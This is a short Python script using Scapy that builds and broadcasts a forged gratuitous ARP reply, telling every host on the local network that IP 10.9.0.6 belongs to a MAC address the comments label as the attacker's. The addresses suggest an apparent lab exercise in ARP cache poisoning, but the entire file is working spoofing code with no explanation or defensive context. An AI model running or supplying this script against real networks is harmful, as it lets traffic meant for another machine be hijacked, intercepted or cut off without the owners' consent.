#!/usr/bin/env python3
from scapy.all import *
E = Ether(dst='ff:ff:ff:ff:ff:ff', src = '02:42:0a:09:00:69') #all ff MAC represents broadcasted packet and for src is Attacker MAC
A = ARP(hwsrc='02:42:0a:09:00:69', psrc='10.9.0.6', hwdst='ff:ff:ff:ff:ff:ff', pdst='10.9.0.6')
A.op = 2 # 1 for ARP request; 2 for ARP reply
pkt = E/A
pkt.show()
sendp(pkt)
